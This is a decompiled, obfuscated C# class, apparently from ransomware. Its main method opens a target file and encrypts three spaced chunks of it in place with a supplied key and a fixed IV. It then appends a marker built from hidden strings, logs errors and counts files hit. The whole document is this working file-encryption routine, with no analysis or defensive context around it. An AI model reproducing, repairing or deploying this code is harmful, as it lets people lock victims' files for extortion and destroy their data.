using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using bRkyiqQJSFr;

namespace ybfSLIGKlaODvJ;

internal sealed class eQDWwInDCVt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int UNzfXRGJhIw(long long_0)
	{
		return (int)long_0;
	}

	public static bool MzXnLHyJOA(string mBiOOjgofNVJSDK, string DUwkDibDRBaPE, string lBlNfPptWFxN, byte[] ZuOBzcNDCoWm = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(mBiOOjgofNVJSDK, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = UNzfXRGJhIw(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(DUwkDibDRBaPE) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(DUwkDibDRBaPE) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(DUwkDibDRBaPE) * 1024 * 1024) / 10;
				}
				int wwfwgYGijdM = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = sOEOHxhEDfEc(mBiOOjgofNVJSDK, fileStream, wwfwgYGijdM, num * i);
					array = (iWNOuKBWgwsf.JQllwusRFZbJU ? eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(lBlNfPptWFxN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(lBlNfPptWFxN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					RpkahzhoSgz(mBiOOjgofNVJSDK, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (iWNOuKBWgwsf.sFwpaHIPJDNK ? Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107398567)) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400762)) + Convert.ToString(DUwkDibDRBaPE) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400762))) : Encoding.ASCII.GetBytes(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107398567)) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400739)) + Convert.ToString(DUwkDibDRBaPE) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400739))));
			if (!iWNOuKBWgwsf.sFwpaHIPJDNK)
			{
				using FileStream fileStream2 = new FileStream(mBiOOjgofNVJSDK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(mBiOOjgofNVJSDK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(ZuOBzcNDCoWm, 0, ZuOBzcNDCoWm.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (iWNOuKBWgwsf.eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(iWNOuKBWgwsf.ZOToawIMfprr, getString_0(107386741) + mBiOOjgofNVJSDK + getString_0(107398586) + ex.Message + getString_0(107396405));
				}
				catch (Exception)
				{
				}
			}
			iWNOuKBWgwsf.cMPsaAWwrrbpa++;
			return false;
		}
		iWNOuKBWgwsf.ureUqQkXCPeI++;
		return true;
	}

	public static byte[] sOEOHxhEDfEc(string GOrZQyHoqxMl, FileStream lHaWSvKDkjIb, int WwfwgYGijdM, int IIwxHOqgaQq = 0)
	{
		byte[] array = new byte[WwfwgYGijdM];
		lHaWSvKDkjIb.Position = IIwxHOqgaQq;
		lHaWSvKDkjIb.Read(array, 0, WwfwgYGijdM);
		return array;
	}

	public static void RpkahzhoSgz(string ieendIVCTkhyZ, FileStream GDrKFfwDZWiHa, byte[] kNDVVaIJHvEQ, int kfZyAEaouUruO = 0)
	{
		GDrKFfwDZWiHa.Position = kfZyAEaouUruO;
		GDrKFfwDZWiHa.Write(kNDVVaIJHvEQ, 0, kNDVVaIJHvEQ.Length);
	}

	static eQDWwInDCVt()
	{
		Strings.CreateGetStringDelegate(typeof(eQDWwInDCVt));
	}
}
